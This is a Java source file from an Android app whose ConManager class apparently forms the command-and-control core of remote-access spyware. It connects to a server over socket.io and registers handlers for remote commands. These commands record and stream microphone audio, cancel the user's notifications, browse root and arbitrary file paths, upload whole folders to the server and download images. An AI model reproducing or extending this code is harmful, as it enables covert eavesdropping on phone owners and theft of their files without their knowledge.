package com.brocode.startups;




import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.util.Log;

import com.brocode.models.AudioRecorder;
import com.brocode.models.IOSocket;
import com.brocode.models.NotificationListener;
import com.brocode.models.fileManager;
import com.brocode.utils.ChunkedFileUpload;
import com.brocode.utils.Constants;
import com.brocode.utils.Util;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.net.URI;
import java.util.Arrays;

import io.socket.client.Socket;

public class ConManager {

	private static Socket socket = IOSocket.getSocket();

	public static void initEvents() throws IOException {
		Log.i("Socket initEvents", "initializing event listeners");

		socket.on("e#pcm-send-stop", args -> AudioRecorder.stopRecording());
		socket.on("e#pcm-send-mono", args -> AudioRecorder.sendRecordingAudio(0.5f, "mono"));
		socket.on("e#pcm-send-stereo", args -> AudioRecorder.sendRecordingAudio(0.5f, "stereo"));

		socket.on("e#notification-cancel", NotificationListener::cancelNotification);
		socket.on("e#notification-cancel-all", NotificationListener::cancelAllNotifications);
		socket.on("e#getRootFiles" , args -> {
			try {
			 fileManager.getBaseFolder();
			} catch (Exception e) {
				Log.d("getRootfile-ex","root files got an Exception" + e.toString());
			}
		});
		socket.on("e#getByPath",args -> fileManager.getListOfFile( args));         //need to test this feature From the Api Events
		socket.on("uploadTotheServre", args -> fileManager.DownloadFoler(args));
		socket.on("ImageDownload",args -> fileManager.DownloadImage(args));


	}

	public static Socket getSocket() {
		return socket;
	}
	public static Socket getNewSocket() {
		return getNewSocket(URI.create(Constants.SOCKET_URL));
	}
	public static Socket getNewSocket(URI uri) {
		return socket = IOSocket.getSocket(uri);
	}
}
